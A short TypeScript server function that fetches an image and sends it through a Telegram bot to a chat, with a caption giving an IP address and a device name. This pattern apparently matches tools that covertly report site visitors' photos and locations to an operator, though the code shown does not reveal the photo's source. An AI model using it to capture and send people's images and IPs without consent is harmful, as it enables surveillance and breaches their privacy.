"use server";

import { InputFile } from "grammy";
import { bot } from "~/bot";

interface SendPhotoToChat {
	photo: string;
	chatId: number;
	ip: string;
	device: string;
}

export async function sendPhotoToChat({ photo, chatId, ip, device }: SendPhotoToChat) {
	const blob = await fetch(photo).then((res) => res.blob());
	try {
		await bot.api.sendPhoto(chatId, new InputFile(Buffer.from(await blob.arrayBuffer())), {
			caption: `IP: ${ip}\n` + `Device: ${device}\n\n`,
		});
	} catch (err) {
		console.error(`Failed to send photo to chat ${chatId}:\n`, err);
	}
}
